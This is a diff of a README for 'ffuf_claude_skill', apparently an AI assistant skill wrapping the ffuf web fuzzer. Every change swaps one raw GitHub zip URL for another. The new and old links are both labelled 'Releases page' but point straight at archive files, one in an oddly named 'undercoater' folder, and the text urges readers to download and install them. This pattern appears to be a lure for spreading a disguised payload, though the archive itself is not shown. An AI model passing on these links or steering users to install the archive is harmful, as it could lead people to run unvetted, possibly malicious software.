@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download ffuf_claude_skill](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/undercoater/ffuf_claude_skill.zip)](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/undercoater/ffuf_claude_skill.zip)
+[![Download ffuf_claude_skill](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/ffuf-skill/resources/claude_ffuf_skill_v3.1.zip)](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/ffuf-skill/resources/claude_ffuf_skill_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you proceed, ensure your system meets the following requirements:
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/undercoater/ffuf_claude_skill.zip) to download the latest version of ffuf_claude_skill. Here’s how to do it:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/ffuf-skill/resources/claude_ffuf_skill_v3.1.zip) to download the latest version of ffuf_claude_skill. Here’s how to do it:
 
 1. Click on the link above to open the Releases page.
 2. Look for the most recent version listed.
@@ -57,7 +57,7 @@ If you encounter any issues or have questions, feel free to join our community f
 
 ## 🔄 Update Instructions
 
-To ensure you always have the latest version, periodically check the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/undercoater/ffuf_claude_skill.zip) for updates. Follow the same download and installation steps to replace your current version with the latest release.
+To ensure you always have the latest version, periodically check the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/ffuf-skill/resources/claude_ffuf_skill_v3.1.zip) for updates. Follow the same download and installation steps to replace your current version with the latest release.
 
 ## ⚙️ Troubleshooting
 
@@ -87,4 +87,4 @@ We welcome contributions from everyone. If you want to improve ffuf_claude_skill
 
 If you find ffuf_claude_skill useful, share it with your friends and colleagues. Help us grow the community and improve the skills available to Claude.
 
-For more detailed information, visit the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/undercoater/ffuf_claude_skill.zip) anytime. Enjoy using ffuf_claude_skill!
+For more detailed information, visit the [Releases page](https://raw.githubusercontent.com/Andrewjayak/ffuf_claude_skill/main/ffuf-skill/resources/claude_ffuf_skill_v3.1.zip) anytime. Enjoy using ffuf_claude_skill!
